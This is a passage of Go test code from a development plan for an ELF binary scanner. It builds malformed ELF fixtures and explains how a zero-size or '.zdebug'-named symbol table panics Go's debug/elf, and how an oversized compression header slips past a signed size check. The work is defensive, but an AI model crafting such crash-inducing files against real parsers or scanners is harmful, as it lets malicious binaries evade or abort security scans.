		neededOffsets[i] = intern(n)
	}
	var sonameOff uint32
	if spec.soname != "" {
		sonameOff = intern(spec.soname)
	}

	// .dynsym. Entry zero is the reserved null symbol; getSymbols64 skips it, so
	// the imports start at entry one. A stripped file has no .dynsym at all, and
	// the .zdebug shape carries the decompression header instead of symbols, while
	// shortDynsym carries a body too short to hold even the null entry.
	var dynsym []byte
	if !spec.stripped {
		switch {
		case spec.zdebugDynsym:
			// A .zdebug header: "ZLIB" and a big-endian uncompressed size. The size
			// here is 0, which is what open-time parsing turns into an empty read.
			dynsym = make([]byte, symEntSize*2)
			copy(dynsym[0:4], "ZLIB")
		case spec.shortDynsym:
			// A body under one entry wide. It is written verbatim with sh_size == 8,
			// so every header the file parser sees is ordinary; only the length the
			// symbol reader tests rejects it.
			dynsym = make([]byte, 8)
		default:
			dynsym = make([]byte, symEntSize*(len(spec.imports)+1))
			for i, off := range importOffsets {
				e := dynsym[symEntSize*(i+1):]
				le.PutUint32(e[0:4], off)
				e[4] = byte(elf.STB_GLOBAL)<<4 | byte(elf.STT_FUNC)
				e[5] = 0
				le.PutUint16(e[6:8], uint16(elf.SHN_UNDEF))
				// st_value stays zero: an imported symbol has no address in this file,
				// which is exactly why a symbol finding carries no byte offset.
				le.PutUint64(e[8:16], 0)
				le.PutUint64(e[16:24], 0)
			}
		}
	}

	// .dynamic: one DT_NEEDED per library, an optional DT_SONAME, then DT_NULL.
	nDyn := len(spec.needed)
	if spec.soname != "" {
		nDyn++
	}
	dynamic := make([]byte, dynEntSize*(nDyn+1))
	di := 0
	for _, off := range neededOffsets {
		e := dynamic[dynEntSize*di:]
		le.PutUint64(e[0:8], uint64(elf.DT_NEEDED))
		le.PutUint64(e[8:16], uint64(off))
		di++
	}
	if spec.soname != "" {
		e := dynamic[dynEntSize*di:]
		le.PutUint64(e[0:8], uint64(elf.DT_SONAME))
		le.PutUint64(e[8:16], uint64(sonameOff))
		di++
	}
	// The DT_NULL terminator is the zeroed final entry written by make above.

	// .shstrtab: the section names, indexed by offset.
	shstrtab := []byte{0}
	shName := func(s string) uint32 {
		off := uint32(len(shstrtab))
		shstrtab = append(shstrtab, s...)
		shstrtab = append(shstrtab, 0)
		return off
	}
	nText := shName(".text")
	nInit := shName(".init")
	nDynstr := shName(".dynstr")
	dynsymName := ".dynsym"
	if spec.zdebugDynsym {
		dynsymName = ".zdebug_dynsym"
	}
	nDynsym := shName(dynsymName)
	nDynamic := shName(".dynamic")
	nShstrtab := shName(".shstrtab")

	// Lay out the file. Sections start at 64 unless a program header table and
	// interpreter path precede them.
	off := ehSize
	phoff, interpOff := 0, 0
	if spec.interp != "" {
		phoff = off
		off = align8(off + phEntSize)
		interpOff = off
		off = align8(off + len(spec.interp) + 1) // + trailing NUL
	}
	textOff := off
	off = align8(off + len(spec.text))
	initOff := off
	off = align8(off + len(spec.text2))
	dynstrOff := off
	off = align8(off + len(dynstr))
	dynsymOff := off
	off = align8(off + len(dynsym))
	dynamicOff := off
	off = align8(off + len(dynamic))
	shstrtabOff := off
	off = align8(off + len(shstrtab))
	shoff := off

	// A file with no section header table is one where e_shoff and e_shnum are
	// both zero; debug/elf accepts that pair and reports no sections.
	if spec.noSections {
		shoff = 0
	}
	bufLen := off
	if shoff != 0 {
		bufLen = shoff + shEntSize*shNum
	}
	buf := make([]byte, bufLen)

	// ELF header.
	copy(buf[0:4], []byte{0x7f, 'E', 'L', 'F'})
	buf[4] = byte(elf.ELFCLASS64)
	buf[5] = byte(elf.ELFDATA2LSB)
	buf[6] = byte(elf.EV_CURRENT)
	buf[7] = byte(elf.ELFOSABI_NONE)
	le.PutUint16(buf[16:18], uint16(elf.ET_DYN))
	le.PutUint16(buf[18:20], uint16(elf.EM_X86_64))
	le.PutUint32(buf[20:24], uint32(elf.EV_CURRENT))
	le.PutUint64(buf[32:40], uint64(phoff)) // e_phoff
	le.PutUint64(buf[40:48], uint64(shoff)) // e_shoff
	le.PutUint16(buf[52:54], ehSize)
	le.PutUint16(buf[54:56], phEntSize)
	phnum := 0
	if spec.interp != "" {
		phnum = 1
	}
	le.PutUint16(buf[56:58], uint16(phnum)) // e_phnum
	le.PutUint16(buf[58:60], shEntSize)
	if shoff != 0 {
		le.PutUint16(buf[60:62], shNum)    // e_shnum
		le.PutUint16(buf[62:64], secShstr) // e_shstrndx: .shstrtab is section 6
	}

	// Program header table, when requested. Only PT_INTERP is needed; a PT_PHDR
	// entry and a .interp section are conventional, not required - collectELF
	// only walks f.Progs for PT_INTERP and opens its file range.
	if spec.interp != "" {
		b := buf[phoff:]
		le.PutUint32(b[0:4], uint32(elf.PT_INTERP))
		le.PutUint32(b[4:8], uint32(elf.PF_R))             // p_flags: read (conventional)
		le.PutUint64(b[8:16], uint64(interpOff))           // p_offset
		le.PutUint64(b[16:24], 0)                          // p_vaddr
		le.PutUint64(b[24:32], 0)                          // p_paddr
		le.PutUint64(b[32:40], uint64(len(spec.interp)+1)) // p_filesz
		le.PutUint64(b[40:48], uint64(len(spec.interp)+1)) // p_memsz
		le.PutUint64(b[48:56], 1)                          // p_align
		copy(buf[interpOff:], spec.interp)                 // trailing NUL from make
	}

	// Section headers, written field by field in Section64's order.
	sh := func(i int, name uint32, typ elf.SectionType, flags uint64, offset, size uint64, link, info uint32, addralign, entsize uint64) {
		b := buf[shoff+i*shEntSize:]
		le.PutUint32(b[0:4], name)
		le.PutUint32(b[4:8], uint32(typ))
		le.PutUint64(b[8:16], flags)
		le.PutUint64(b[16:24], 0) // sh_addr
		le.PutUint64(b[24:32], offset)
		le.PutUint64(b[32:40], size)
		le.PutUint32(b[40:44], link)
		le.PutUint32(b[44:48], info)
		le.PutUint64(b[48:56], addralign)
		le.PutUint64(b[56:64], entsize)
	}

	if shoff != 0 {
		textFlags := uint64(elf.SHF_ALLOC)
		if spec.textExec {
			textFlags |= uint64(elf.SHF_EXECINSTR)
		}
		// sh_size is the declared size. spec.overrun adds bytes that were never
		// written, so the section claims more than the file holds - which the
		// extractor must notice by comparing what it read against this number
		// rather than by trusting it.
		sh(secText, nText, elf.SHT_PROGBITS, textFlags, uint64(textOff), uint64(len(spec.text))+spec.overrun, 0, 0, 8, 0)
		if spec.text2 != nil {
			initFlags := uint64(elf.SHF_ALLOC)
			if spec.text2Exec {
				initFlags |= uint64(elf.SHF_EXECINSTR)
			}
			sh(secInit, nInit, elf.SHT_PROGBITS, initFlags, uint64(initOff), uint64(len(spec.text2)), 0, 0, 8, 0)
		}
		sh(secDynstr, nDynstr, elf.SHT_STRTAB, uint64(elf.SHF_ALLOC), uint64(dynstrOff), uint64(len(dynstr)), 0, 0, 1, 0)
		if !spec.stripped {
			// sh_size is the declared size. zeroDynsym writes 0 over it, keeping
			// the section present but claiming no bytes - the shape that panics
			// debug/elf's 64-bit symbol reader.
			dynsymSize := uint64(len(dynsym))
			if spec.zeroDynsym {
				dynsymSize = 0
			}
			sh(secDynsym, nDynsym, elf.SHT_DYNSYM, uint64(elf.SHF_ALLOC), uint64(dynsymOff), dynsymSize, secDynstr, 1, 8, symEntSize)
		}
		sh(secDynamic, nDynamic, elf.SHT_DYNAMIC, uint64(elf.SHF_ALLOC), uint64(dynamicOff), uint64(len(dynamic)), secDynstr, 0, 8, dynEntSize)
		sh(secShstr, nShstrtab, elf.SHT_STRTAB, 0, uint64(shstrtabOff), uint64(len(shstrtab)), 0, 0, 1, 0)
	}

	copy(buf[textOff:], spec.text)
	copy(buf[initOff:], spec.text2)
	copy(buf[dynstrOff:], dynstr)
	copy(buf[dynsymOff:], dynsym)
	copy(buf[dynamicOff:], dynamic)
	copy(buf[shstrtabOff:], shstrtab)
	return buf
}

// uniformBytes returns n bytes whose histogram is exactly uniform over all 256
// values. The multiplier is coprime with 256, so the sequence is a permutation
// cycle and the entropy is exactly 8 bits per byte - which is what lets a test
// assert a number rather than a range.
func uniformBytes(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(i * 7)
	}
	return b
}

// elfCompressedFixture builds a minimal ELF64 with one section, .text, carrying
// SHF_EXECINSTR | SHF_COMPRESSED. Its compression header (an Elf64_Chdr) declares
// chSize as the uncompressed size, and its body is a real zlib stream of payload,
// so opening the section succeeds and yields len(payload) bytes.
//
// It exists because chSize is attacker-controlled and debug/elf does not range-
// check it: for a compressed section it copies ch_size straight into
// Section.Size, applying an int64 range check only to sh_size. A value at or
// above 2^63 therefore makes int64(Section.Size) negative, while the readable
// size stays small - the exact pair a short-read check has to compare, and the
// pair a signed comparison mis-handles.
func elfCompressedFixture(t *testing.T, chSize uint64, payload []byte) []byte {
	t.Helper()

	const (
		ehSize    = 64
		shEntSize = 64
		chdrSize  = 24 // Elf64_Chdr: uint32 + uint32 + uint64 + uint64
	)
	le := binary.LittleEndian
	align8 := func(n int) int { return (n + 7) &^ 7 }

	var z bytes.Buffer
	zw := zlib.NewWriter(&z)
	if _, err := zw.Write(payload); err != nil {
		t.Fatalf("zlib write: %v", err)
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zlib close: %v", err)
	}

	// The section body is the compression header followed by the compressed
	// stream. debug/elf reads the header at load time and decompresses from
	// compressionOffset (the header's own size) onward.
	body := make([]byte, chdrSize+z.Len())
	le.PutUint32(body[0:4], uint32(elf.COMPRESS_ZLIB)) // ch_type
	le.PutUint32(body[4:8], 0)                         // ch_reserved
	le.PutUint64(body[8:16], chSize)                   // ch_size (uncompressed)
	le.PutUint64(body[16:24], 1)                       // ch_addralign
	copy(body[chdrSize:], z.Bytes())

	shstrtab := []byte{0}
	nameText := uint32(len(shstrtab))
	shstrtab = append(shstrtab, ".text"...)
	shstrtab = append(shstrtab, 0)
	nameShstr := uint32(len(shstrtab))
	shstrtab = append(shstrtab, ".shstrtab"...)
	shstrtab = append(shstrtab, 0)

	bodyOff := ehSize
	shstrOff := align8(bodyOff + len(body))
	shoff := align8(shstrOff + len(shstrtab))
	buf := make([]byte, shoff+shEntSize*3)

	// ELF header: class 64, little-endian, ET_DYN, no program headers.
	copy(buf[0:4], []byte{0x7f, 'E', 'L', 'F'})
	buf[4] = byte(elf.ELFCLASS64)
	buf[5] = byte(elf.ELFDATA2LSB)
	buf[6] = byte(elf.EV_CURRENT)
	buf[7] = byte(elf.ELFOSABI_NONE)
	le.PutUint16(buf[16:18], uint16(elf.ET_DYN))
	le.PutUint16(buf[18:20], uint16(elf.EM_X86_64))
	le.PutUint32(buf[20:24], uint32(elf.EV_CURRENT))
	le.PutUint64(buf[40:48], uint64(shoff)) // e_shoff
	le.PutUint16(buf[52:54], ehSize)
	le.PutUint16(buf[58:60], shEntSize)
	le.PutUint16(buf[60:62], 3) // e_shnum: null, .text, .shstrtab
	le.PutUint16(buf[62:64], 2) // e_shstrndx

	copy(buf[bodyOff:], body)
	copy(buf[shstrOff:], shstrtab)

	sh := func(i int, name uint32, typ elf.SectionType, flags uint64, offset, size, addralign uint64) {
		b := buf[shoff+i*shEntSize:]
		le.PutUint32(b[0:4], name)
		le.PutUint32(b[4:8], uint32(typ))
		le.PutUint64(b[8:16], flags)
		le.PutUint64(b[24:32], offset)
		le.PutUint64(b[32:40], size)
		le.PutUint64(b[48:56], addralign)
	}
	// .text is executable and compressed; debug/elf takes the section's size from
	// the compression header, so ch_size is what a reader reports as its size.
	// Only the two flags it needs are set - a compressed section that is also
	// SHF_ALLOC is rejected by the reader.
	sh(1, nameText, elf.SHT_PROGBITS, uint64(elf.SHF_EXECINSTR)|uint64(elf.SHF_COMPRESSED), uint64(bodyOff), uint64(len(body)), 1)
	sh(2, nameShstr, elf.SHT_STRTAB, 0, uint64(shstrOff), uint64(len(shstrtab)), 1)
	return buf
}
```

- [ ] **Step 2: 写失败测试**

追加到 `binary_evidence_test.go`：

```go
// TestELFFixtureIsReadByTheStandardLibrary guards the fixture itself. If this
// fails, the bytes are wrong and every assertion built on them is meaningless -
// so it is checked before anything the extractor claims.
func TestELFFixtureIsReadByTheStandardLibrary(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		imports:  []string{"connect", "socket"},
		needed:   []string{"libcurl.so.4"},
		text:     []byte("hello"),
		textExec: true,
	})
	path := writeTestBytes(t, dir, "libevil.so", raw)

	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the fixture: %v", err)
	}
	defer f.Close()

	libs, err := f.ImportedLibraries()
	if err != nil {
		t.Fatalf("ImportedLibraries: %v", err)
	}
	if len(libs) != 1 || libs[0] != "libcurl.so.4" {
		t.Errorf("DT_NEEDED = %v, want [libcurl.so.4]", libs)
	}

	syms, err := f.ImportedSymbols()
	if err != nil {
		t.Fatalf("ImportedSymbols: %v", err)
	}
	names := map[string]bool{}
	for _, s := range syms {
		names[s.Name] = true
	}
	for _, want := range []string{"connect", "socket"} {
		if !names[want] {
			t.Errorf("imported symbol %q missing from the fixture; got %v", want, names)
		}
	}
}

func TestCollectELFEvidence(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		imports:  []string{"connect", "system", "dlopen"},
		needed:   []string{"libcurl.so.4", "libc.so.6"},
		text:     uniformBytes(512),
		textExec: true,
		soname:   "libevil.so.1",
		interp:   "/lib64/ld-linux-x86-64.so.2",
	})
	path := writeTestBytes(t, dir, "libevil.so", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}

	bySource := map[EvidenceSource][]string{}
	for _, l := range set.Lines {
		bySource[l.Source] = append(bySource[l.Source], l.Text)
	}

	for _, want := range []string{"connect", "system", "dlopen"} {
		if !containsString(bySource[SourceDynsym], want) {
			t.Errorf("dynsym evidence missing %q; got %v", want, bySource[SourceDynsym])
		}
	}
	for _, want := range []string{"libcurl.so.4", "libc.so.6"} {
		if !containsString(bySource[SourceNeeded], want) {
			t.Errorf("needed evidence missing %q; got %v", want, bySource[SourceNeeded])
		}
	}
	// The soname and the interpreter are the two facts this parse reads from
	// structure rather than from symbols: collectELF writes the soname as a
	// section line and the interpreter as a notice. Both are asserted in the
	// exact shape it writes, so a format change breaks this test rather than
	// silently passing an assertion written against the old shape.
	if !containsString(bySource[SourceSection], "soname libevil.so.1") {
		t.Errorf("soname section line missing; got %v", bySource[SourceSection])
	}
	if !containsString(bySource[SourceNotice], "interpreter /lib64/ld-linux-x86-64.so.2") {
		t.Errorf("interpreter notice missing; got %v", bySource[SourceNotice])
	}
	var sawExecutableSection, sawHighEntropySection bool
	for _, text := range bySource[SourceSection] {
		if strings.Contains(text, ".text") && strings.Contains(text, "executable=true") {
			sawExecutableSection = true
		}
	}
	for _, text := range bySource[SourceEntropy] {
		if strings.HasPrefix(text, "high-entropy-executable-section .text") {
			sawHighEntropySection = true
		}
	}
	if !sawExecutableSection {
		t.Errorf("no executable .text section line; got %v", bySource[SourceSection])
	}
	if !sawHighEntropySection {
		t.Errorf("a uniform .text produced no entropy verdict; got %v", bySource[SourceEntropy])
	}
}

// TestCollectELFEvidenceSkipsEntropyForDataSections pins the narrower half of the
// same rule: a non-executable section that happens to be near-random says
// nothing, because data is allowed to be random and code is not.
func TestCollectELFEvidenceSkipsEntropyForDataSections(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{text: uniformBytes(512), textExec: false})
	path := writeTestBytes(t, dir, "libdata.so", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}
	for _, l := range set.Lines {
		if l.Source == SourceEntropy {
			t.Errorf("entropy evidence %q for a non-executable section", l.Text)
		}
	}
}

// TestCollectELFEvidenceOnAStrippedFile pins that a file with no dynamic symbol
// table at all is a completed look, not a failure, and that the look says so.
// The fixture omits the SHT_DYNSYM section entirely, which is what makes
// debug/elf return elf.ErrNoSymbols: treating that as an error would make every
// Go binary build in a model package an incomplete scan. The notice it produces
// is what tells a reader the symbol list is empty because there is no table.
//
// The notice names the section type that is absent rather than calling the file
// "stripped or static". A static binary has no .dynsym but does carry .symtab,
// so the old wording was false for it, and a file with no section header table
// at all is not "stripped" either - it is a different condition with its own
// structural bound. A notice is a statement about the bytes, so it says which
// table was looked for and not found.
func TestCollectELFEvidenceOnAStrippedFile(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{text: []byte("no symbols here"), stripped: true})
	path := writeTestBytes(t, dir, "stripped", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF on a file with no .dynsym: %v", err)
	}
	if set.Err != nil {
		t.Errorf("Err = %v, want nil", set.Err)
	}
	if set.Bound.Structural {
		t.Errorf("a stripped file was marked structural (%q); stripping is ordinary and must not withhold a pass", set.Bound.Reason)
	}

	var notices []string
	for _, l := range set.Lines {
		if l.Source == SourceNotice {
			notices = append(notices, l.Text)
		}
	}
	if !containsString(notices, "no dynamic symbol table (SHT_DYNSYM absent)") {
		t.Errorf("no absent-.dynsym notice; got notices %v", notices)
	}
	for _, n := range notices {
		if strings.Contains(n, "stripped or static") {
			t.Errorf("the notice still claims the file is stripped or static: %q", n)
		}
	}
}

// TestCollectELFEvidenceOnAFileWithNoSectionHeaders pins the removal of a
// fail-open. The entropy pass walks the executable sections, so a file with no
// section header table used to walk nothing, emit no line and no bound, and pass
// as clean - a pass that claimed to have looked for packing in a file it never
// examined. The fixture writes e_shoff, e_shnum and e_shstrndx as zero, which is
// the shape of a file whose section table was removed, and that must come back
// as a structural gap that names the section header table rather than as a clean
// pass.
func TestCollectELFEvidenceOnAFileWithNoSectionHeaders(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{text: uniformBytes(512), textExec: true, noSections: true})
	path := writeTestBytes(t, dir, "packed", raw)

	// The fixture itself must survive the standard library before the extractor
	// is asked about it: a file debug/elf refuses is a different case from one
	// it reads and finds no sections in.
	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the sectionless fixture: %v", err)
	}
	if got := len(f.Sections); got != 0 {
		t.Fatalf("fixture sections = %d, want 0", got)
	}
	f.Close()

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("a file with no section header table produced no structural bound; bound = %+v", set.Bound)
	}
	// The reason must name the real condition. It is not a missing symbol table:
	// a stripped file has no .dynsym either and is not bounded, and this file's
	// own case is the absent section header table.
	if !strings.Contains(set.Bound.Reason, "section header table") {
		t.Errorf("bound reason = %q, want it to name the section header table", set.Bound.Reason)
	}
	if strings.Contains(set.Bound.Reason, "symbol") {
		t.Errorf("bound reason = %q, want it not to claim a symbol table is the problem", set.Bound.Reason)
	}
}

// TestCollectELFEvidenceReportsASectionThatOverrunsTheFile pins that a section
// header is not taken at its word. The fixture adds bytes to .text's declared
// sh_size that were never written, so the read stops at end of file and returns
// fewer bytes than the header claims. An extractor that trusted the header and
// measured whatever it got would score a prefix and call it the section; an
// extractor that noticed but said nothing would leave the reader unable to tell
// a short section from a short read. So the shortfall is structural and the
// declared size is still reported as what the header said.
func TestCollectELFEvidenceReportsASectionThatOverrunsTheFile(t *testing.T) {
	dir := t.TempDir()
	const textLen, overrun = 512, 1 << 20
	raw := elfFixtureBytes(t, elfSpec{text: uniformBytes(textLen), textExec: true, overrun: overrun})
	path := writeTestBytes(t, dir, "truncated.so", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("a section declaring more than the file holds produced no structural bound; bound = %+v", set.Bound)
	}
	if !strings.Contains(set.Bound.Reason, "declares") || !strings.Contains(set.Bound.Reason, "readable") {
		t.Errorf("bound reason = %q, want it to state declared and readable byte counts", set.Bound.Reason)
	}

	// size= must still be the declared size, so a reader can pair the section
	// line with the shortfall instead of seeing a number that silently matched
	// the read. The section line carries its executability flag after size=, so
	// the declared size is asserted as the line's prefix and not as the whole
	// line.
	wantDeclared := fmt.Sprintf(".text size=%d", textLen+overrun)
	var sawDeclared bool
	for _, l := range set.Lines {
		if l.Source == SourceSection && strings.HasPrefix(l.Text, ".text size=") {
			sawDeclared = strings.HasPrefix(l.Text, wantDeclared+" ")
		}
	}
	if !sawDeclared {
		t.Errorf("no section line %q; lines = %v", wantDeclared, set.Lines)
	}

	// The short read must not have been scored: an entropy line would be a number
	// over a prefix, presented with the same authority as one over a whole section.
	for _, l := range set.Lines {
		if l.Source == SourceEntropy {
			t.Errorf("a section that overran the file still produced entropy evidence %q", l.Text)
		}
	}
}

// TestCollectELFEvidenceMeasuresEveryExecutableSection pins that the entropy
// pass is per section rather than per file. The fixture carries two executable
// sections, a packed .text and a flat .init, and the file-level boolean a
// one-section fixture cannot distinguish from a loop would report either both or
// neither. Exactly one line may appear, and it must name .text.
func TestCollectELFEvidenceMeasuresEveryExecutableSection(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		text:      uniformBytes(512),
		textExec:  true,
		text2:     bytes.Repeat([]byte{0x90}, 512), // NOP sled: executable and not random
		text2Exec: true,
	})
	path := writeTestBytes(t, dir, "twoexec.so", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}
	if set.Bound.Structural {
		t.Fatalf("a well-formed two-section file was marked structural: %q", set.Bound.Reason)
	}

	var entropyLines []string
	for _, l := range set.Lines {
		if l.Source == SourceEntropy {
			entropyLines = append(entropyLines, l.Text)
		}
	}
	if len(entropyLines) != 1 || !strings.HasPrefix(entropyLines[0], "high-entropy-executable-section .text ") {
		t.Errorf("entropy lines = %v, want exactly one for .text", entropyLines)
	}
}

// TestCollectELFEmptyDynsymIsNotAStrippedFile pins the distinction the stripped
// test cannot see: a .dynsym that exists but holds only the reserved null entry
// yields an empty symbol list and a nil error, not ErrNoSymbols. "This binary
// imports nothing" and "this file has no symbol table" are different facts, and
// reporting the second when the first is true would be a false statement in the
// report - so no notice may appear here.
func TestCollectELFEmptyDynsymIsNotAStrippedFile(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{text: []byte("a library with no imports")})
	path := writeTestBytes(t, dir, "libempty.so", raw)

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF: %v", err)
	}
	for _, l := range set.Lines {
		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
			t.Errorf("a present but empty .dynsym produced the stripped/static notice: %q", l.Text)
		}
	}
}

// TestCollectELFEvidenceOnAZeroSizeDynsym pins the crash guard. A SHT_DYNSYM that
// is present but declares sh_size == 0 makes debug/elf's 64-bit symbol reader
// slice an empty buffer at byte 24 and panic ("slice bounds out of range
// [24:0]") instead of returning an error: its only length check, len(data)%24,
// accepts a zero length. ClassifyBinary returns KindELF on the four magic bytes
// alone, so the shape is reachable from an untrusted file, and a panic aborts the
// whole scan rather than marking the one file incomplete. collectELF has to hold
// the table back - it holds no symbols, so nothing is lost - and must not claim
// the table is absent, which would be a false statement about the file.
func TestCollectELFEvidenceOnAZeroSizeDynsym(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		imports:    []string{"dlopen"},
		zeroDynsym: true,
		text:       []byte("a symbol table present but empty"),
	})
	path := writeTestBytes(t, dir, "zero-dynsym.so", raw)

	// Prove the fixture really carries the crash shape, or the test would pass on
	// a file that cannot panic.
	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the fixture: %v", err)
	}
	ds := f.SectionByType(elf.SHT_DYNSYM)
	if ds == nil {
		f.Close()
		t.Fatal("fixture has no SHT_DYNSYM section")
	}
	size := ds.Size
	f.Close()
	if size != 0 {
		t.Fatalf("fixture .dynsym size = %d, want 0", size)
	}

	// collectELF must return, not panic, and must neither invent a symbol from the
	// unread table nor describe the present table as absent.
	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF on a zero-size .dynsym: %v", err)
	}
	for _, l := range set.Lines {
		if l.Source == SourceDynsym {
			t.Errorf("a zero-size .dynsym produced symbol evidence %q", l.Text)
		}
		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
			t.Errorf("a present but zero-size .dynsym was reported as an absent table: %q", l.Text)
		}
	}
}

// TestCollectELFEvidenceOnAZdebugNamedDynsym pins the second route to the same
// crash. A section named ".zdebug..." of type SHT_DYNSYM whose body begins with
// "ZLIB" has Section.Size rewritten from eight bytes the file chooses when the
// section is opened - not when the file is parsed - so an on-disk sh_size that
// looks perfectly ordinary (48 here) still yields an empty buffer, which the
// symbol reader slices at entry 24 and panics on. Only reading the section the
// way the reader does sees through it; a guard written against the header size
// would wave this file through.
func TestCollectELFEvidenceOnAZdebugNamedDynsym(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		zdebugDynsym: true,
		text:         []byte("a disguised symbol table"),
	})
	path := writeTestBytes(t, dir, "zdebug-dynsym.so", raw)

	// Check the shape the file presents before anything opens the section, since
	// opening it is what rewrites the size - then confirm the empty buffer.
	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the fixture: %v", err)
	}
	ds := f.SectionByType(elf.SHT_DYNSYM)
	if ds == nil {
		f.Close()
		t.Fatal("fixture has no SHT_DYNSYM section")
	}
	name, onDisk := ds.Name, ds.Size
	data, dataErr := ds.Data()
	f.Close()
	if !strings.HasPrefix(name, ".zdebug") {
		t.Fatalf("fixture .dynsym name = %q, want a \".zdebug\" prefix", name)
	}
	if onDisk == 0 {
		t.Fatalf("fixture .dynsym on-disk size = 0; the point is that it looks ordinary")
	}
	if dataErr != nil {
		t.Fatalf("reading the fixture's section: %v", dataErr)
	}
	if len(data) != 0 {
		t.Fatalf("fixture section yielded %d bytes, want 0 - the ZLIB header must declare an empty table", len(data))
	}

	// collectELF must return, not panic, and must neither invent a symbol from the
	// unread table nor describe the present table as absent.
	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF on a .zdebug-named .dynsym: %v", err)
	}
	for _, l := range set.Lines {
		if l.Source == SourceDynsym {
			t.Errorf("a .zdebug-named .dynsym produced symbol evidence %q", l.Text)
		}
		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
			t.Errorf("a present .zdebug-named .dynsym was reported as an absent table: %q", l.Text)
		}
	}
}

// TestCollectELFEvidenceFailsClosedOnATruncatedDynsym pins the boundary the
// other two fixtures do not reach. A SHT_DYNSYM whose body is shorter than one
// 24-byte entry (8 bytes here) is malformed, not empty: getSymbols64 rejects a
// length that is not a multiple of the entry size and returns a format error, so
// collectELF must fail the scan closed and say the table could not be read.
// Skipping it as empty - which is what a length-range guard (len(data) < 24)
// would do - is a fail-open, and it is the specific regression the wrong guard
// shape would have introduced: the two panic fixtures both have a genuinely
// empty buffer, so both pass under either guard, while only this one tells them
// apart.
func TestCollectELFEvidenceFailsClosedOnATruncatedDynsym(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		shortDynsym: true,
		text:        []byte("a symbol table too short to hold a symbol"),
	})
	path := writeTestBytes(t, dir, "truncated-dynsym.so", raw)

	// Prove the fixture carries the shape: a non-empty body that is not a whole
	// number of entries, under an ordinary name and an ordinary declared size.
	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the fixture: %v", err)
	}
	ds := f.SectionByType(elf.SHT_DYNSYM)
	if ds == nil {
		f.Close()
		t.Fatal("fixture has no SHT_DYNSYM section")
	}
	name, size := ds.Name, ds.Size
	data, dataErr := ds.Data()
	f.Close()
	if name != ".dynsym" {
		t.Fatalf("fixture .dynsym name = %q, want %q", name, ".dynsym")
	}
	if dataErr != nil {
		t.Fatalf("reading the fixture's section: %v", dataErr)
	}
	if len(data) == 0 {
		t.Fatal("fixture section yielded 0 bytes; this test is about a non-empty, malformed table")
	}
	if uint64(len(data)) != size {
		t.Fatalf("fixture section yielded %d bytes under a declared size of %d; the malformation must be the length, not a short read", len(data), size)
	}
	if len(data)%24 == 0 {
		t.Fatalf("fixture body is %d bytes, a whole number of 24-byte entries; the reader would accept it", len(data))
	}

	// collectELF must fail closed rather than skip the table as empty.
	set := newTestEvidence(path, KindELF)
	err = collectELF(path, set, DefaultBinaryConfig())
	if err == nil {
		t.Fatal("collectELF accepted a truncated .dynsym; a malformed table must fail the scan rather than be skipped as empty")
	}
	if !strings.Contains(err.Error(), "dynamic symbols") {
		t.Errorf("error = %v, want it to name the dynamic symbol read", err)
	}
}

// TestCollectELFEvidenceReportsACompressedSectionWithAnOutOfRangeSize pins the
// unsigned size comparison. For a SHF_COMPRESSED section debug/elf takes
// Section.Size from the compression header's ch_size without the int64 range
// check it applies to sh_size, so a crafted ch_size with the top bit set makes
// int64(Section.Size) negative: a signed "read < int64(sec.Size)" is false for
// every non-negative read, the section scores as read in full, and - because
// executable code is not random - its entropy is reported as clean. The fixture's
// section decompresses to far fewer bytes than it declares, which is exactly the
// short-read the check exists to catch, so the size must be compared in its own
// unsigned domain.
func TestCollectELFEvidenceReportsACompressedSectionWithAnOutOfRangeSize(t *testing.T) {
	// 2^63, one past the largest int64: int64(ch_size) is negative.
	const declared = uint64(1) << 63
	payload := bytes.Repeat([]byte{0x90}, 4096) // low entropy: no verdict either way

	dir := t.TempDir()
